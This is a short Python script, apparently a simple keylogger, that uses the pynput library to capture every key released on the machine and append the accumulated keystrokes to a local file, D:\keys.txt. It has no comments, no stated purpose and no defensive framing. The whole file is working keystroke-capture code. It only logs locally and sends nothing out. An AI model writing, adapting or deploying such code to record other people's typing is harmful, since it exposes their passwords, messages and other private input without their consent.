# -*- coding:utf-8 -*-
from pynput.keyboard import Key, Controller, Listener
import time

keyboard = Controller()
keys = []


def on_press(key):
    string = str(key).replace("'", "")

def on_release(key):
    global keys
    string = str(key).replace("'", "")
    keys.append('\r' + string)
    main_string = "".join(keys)
    print(main_string,len(keys),keys)
    if len(main_string) >15:
        with open('D:\keys.txt', 'a') as f:
            f.write(main_string)
            keys = []


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()